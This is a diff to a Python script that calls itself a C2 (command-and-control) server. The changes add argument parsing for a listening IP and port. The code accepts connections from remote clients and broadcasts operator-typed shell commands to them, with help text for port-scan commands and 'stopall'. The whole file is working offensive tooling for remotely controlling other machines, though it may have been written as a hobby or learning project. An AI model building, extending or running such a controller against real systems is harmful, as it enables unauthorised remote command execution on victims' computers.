@@ -1,15 +1,20 @@
+# ==================================================================================================================== #
+# Version 1.2.0 of my C2 Server!                                                                                       #
+# Made by Eric E. Github: https://github.com/EricEsquivel                                                              #
+# ==================================================================================================================== #
+
 import socket
 import sys
 import threading
 import time
 
-s = socket.socket()
-cmdserver_ip = "" ################ ENTER THE SERVER IP YOU WANT LISTENING IN THIS STRING ######################
-cmdserver_port = 5050
-cmdaddress = (cmdserver_ip, cmdserver_port)
-s.bind(cmdaddress)
-thread_list = []
-thread_recv_list = []
+
+def usage():
+    print("""
+    usage: server.py <ip> <port>
+    """)
+    sys.exit()
+
 
 def start(cmdaddress):
     s.listen()
@@ -24,6 +29,7 @@ def start(cmdaddress):
         thread_recv_list.append(listen_thread)
         print(f"Active connections: {threading.active_count() - 2}")
         print("Type 'help' for a list of commands")
+
 
 def receive_info(connection, address):
     try: # Figure out how to make this not throw errors when "stopall" is entered without using try and except
@@ -62,13 +68,55 @@ def sending():
         command = input(">> ")
         if command == "help":
             print("""
-            Custom commands: 'portscan' 'open ports' 'nmapscan'
+            Custom commands: 'portscan' 'openports'
             Can also run normal windows/linux commands
+            Use 'stopall' to disconnect clients
             """)
             continue
         else:
             broadcast(command)
 
 
-print("Server is starting")
+# Run checks for args
+if len(sys.argv) == 1:
+    print("Missing arguments. Looking for ip and port")
+    usage()
+elif len(sys.argv) == 2:
+    if sys.argv[1] == "help" or sys.argv[1] == "-h" or sys.argv[1] == "--help":
+        usage()
+        sys.exit()
+    print("Missing arguments. Looking for a port")
+    usage()
+elif len(sys.argv) > 3:
+    print("Too many arguments!")
+    usage()
+else:
+    pass
+
+cmdserver_ip = sys.argv[1]
+try:
+    cmdserver_port = int(sys.argv[2])
+    if cmdserver_port not in range(1,65536):
+        raise Exception
+except ValueError:
+    print("Port given is not an integer")
+    usage()
+except:
+    print("Port given is not in range!")
+    usage()
+
+# Final check
+cmdaddress = (cmdserver_ip,cmdserver_port)
+s = socket.socket()
+try:
+    s.bind(cmdaddress)
+except socket.gaierror:
+    print("Invalid address given")
+    usage()
+
+
+thread_list = []
+thread_recv_list = []
+
+# Once checks are done, start connection
 start(cmdaddress)
